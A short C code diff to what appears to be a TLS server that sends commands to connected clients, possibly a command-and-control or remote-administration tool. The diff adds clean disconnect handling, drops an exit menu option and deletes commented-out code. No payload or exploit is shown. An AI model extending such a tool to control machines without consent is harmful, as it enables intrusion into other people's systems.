@@ -119,7 +119,6 @@ static void *handle_stdin(void *arg) {
         printf("Usual commands :\n");
         printf("[1] Launch a command to a client\n");
         printf("[2] Basic commands\n");
-        printf("[3] Exit\n");
 
         fgets(buffer, sizeof(buffer), stdin);
         if (strncmp(buffer, "1", 1) == 0) {
@@ -651,7 +650,23 @@ static void *handle_client(void *arg) {
         result = ntohl(result);
 
         if (bytes <= 0) {
-            perror("SSL_read");
+            perror("Client disconnected or SSL error");
+            SSL_shutdown(client->ssl);
+            SSL_free(client->ssl);
+            close(client->socket);
+            pthread_mutex_lock(&client_mutex);
+            int i;
+            for (i = 0; i < client_count; i++) {
+                if (clients[i].socket == client->socket) {
+                    break;
+                }
+            }
+            if (i < client_count) {
+                clients[i] = clients[client_count - 1];
+                client_count--;
+            }
+            pthread_mutex_unlock(&client_mutex);
+            pthread_exit(NULL);
         }
 
         if (result == RESULT) {
@@ -666,30 +681,6 @@ static void *handle_client(void *arg) {
             }
             fflush(buffer);
         }
-
-        // if (bytes <= 0) {
-        //     perror("Client disconnected or SSL error");
-        //     SSL_shutdown(client->ssl);
-        //     SSL_free(client->ssl);
-        //     close(client->socket);
-        //     pthread_mutex_lock(&client_mutex);
-        //     int i;
-        //     for (i = 0; i < client_count; i++) {
-        //         if (clients[i].socket == client->socket) {
-        //             break;
-        //         }
-        //     }
-        //     if (i < client_count) {
-        //         clients[i] = clients[client_count - 1];
-        //         client_count--;
-        //     }
-        //     pthread_mutex_unlock(&client_mutex);
-        //     pthread_exit(NULL);
-        // }
-
-        // buffer[bytes] = 0;
-        // printf("Client: %s\n", buffer);
-        //SSL_write(client->ssl, buffer, bytes);
     }
 }
 
